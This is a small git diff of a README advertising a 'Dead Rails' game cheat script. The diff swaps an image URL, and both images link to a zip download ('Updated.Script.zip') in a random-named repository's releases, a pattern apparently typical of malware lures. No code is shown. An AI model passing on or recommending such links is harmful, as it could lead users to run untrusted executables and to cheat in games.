@@ -7,7 +7,7 @@ Welcome to the **ultimate Dead Rails script experience** for 2025! Whether you'r
 [![hq720](https://github.com/user-attachments/assets/e31143b0-3d33-4748-893a-3e3503062a3d)
 ](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
 
-[![image](https://github.com/user-attachments/assets/fb315561-bdfb-4ac6-8234-12510df4fbf0)
+[![image](https://github.com/user-attachments/assets/ef370c20-5aca-4375-bed6-7c6d24c22825)
 ](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
 
 ## ⚙️ Features Overview
